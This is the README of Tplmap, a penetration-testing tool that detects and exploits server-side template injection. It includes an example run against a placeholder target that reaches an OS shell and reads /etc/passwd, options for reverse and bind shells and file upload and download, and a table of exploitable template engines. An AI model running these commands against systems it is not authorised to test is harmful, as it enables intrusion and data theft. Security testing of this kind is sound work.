Tplmap
======

Tplmap (short for _Template Mapper_) is a tool that automate the process of detecting and exploiting Server-Side Template Injection vulnerabilities (SSTI). This assists SSTI exploitation to compromise the application and achieve remote command execution on the operating system. 

The tool can be used by security researches and penetration testers, to detect and exploit vulnerabilities and study the template injection flaws.

Tplmap template engines support an capabilities can be extended via plugins. Several sandbox break-out methodologies came from James Kett's research [Server-Side Template Injection: RCE For The Modern Web App][1] and other researches.

As advanced features Tplmap detects and achieve command execution in case of blind injections and is able to inject in code context.

Example
--------

```
$ ./tplmap.py -u 'http://www.target.com/app?id=*' 
[+] Tplmap 0.1
    Automatic Server-Side Template Injection Detection and Exploitation Tool

[+] Found placeholder in GET parameter 'inj'
[+] Smarty plugin is testing rendering with tag '{*}'
[+] Smarty plugin is testing blind injection
[+] Mako plugin is testing rendering with tag '${*}'
...
[+] Freemarker plugin is testing blind injection
[+] Velocity plugin is testing rendering with tag '#set($c=*)\n${c}\n'
[+] Jade plugin is testing rendering with tag '\n= *\n'
[+] Jade plugin has confirmed injection with tag '\n= *\n'
[+] Tplmap identified the following injection point:

  Engine: Jade
  Injection: \n= *\n
  Context: text
  OS: darwin
  Technique: render
  Capabilities:
  
   Code evaluation: yes, javascript code
   Shell command execution: yes
   File write: yes
   File read: yes
   Bind and reverse shell: yes

[+] Rerun tplmap providing one of the following options:

   --os-shell or --os-cmd to execute shell commands via the injection
   --upload LOCAL REMOTE to upload files to the server
   --download REMOTE LOCAL to download remote files
   --bind-shell PORT to bind a shell on a port and connect to it
   --reverse-shell HOST PORT to run a shell back to the attacker's HOST PORT
        
$ ./tplmap.py -u 'http://www.target.com/app?id=*' --os-shell
[+] Run commands on the operating system.
linux $ whoami
www-data
linux $ ls -al /etc/passwd
-rw-r--r--  1 root  wheel  5925 16 Sep  2015 /etc/passwd
linux $

```

Supported template engines
--------------------------

| Template engine    | Detection          | Command execution | Code evaluation | File read | File write |
|--------------------|--------------------|-------------------|-----------------|-----------|------------|
| Mako               |  render+blind      | yes               | python          | yes       | yes        |
| Jinja2             |  render+blind      | yes               | python          | yes       | yes        |
| Nunjucks           |  render+blind      | yes               | javascript      | yes       | yes        |
| Jade               |  render+blind      | yes               | javascript      | yes       | yes        |
| Smarty (unsecured) |  render+blind      | yes               | PHP             | yes       | yes        |
| Freemarker         |  render+blind      | yes               | no              | yes       | yes        |
| Velocity           |  render            | no                | no              | no        | no         |
| Twig               |  render            | no                | no              | no        | no         |
| Smarty (secured)   |  render            | no                | no              | no        | no         |


[1]: http://blog.portswigger.net/2015/08/server-side-template-injection.html
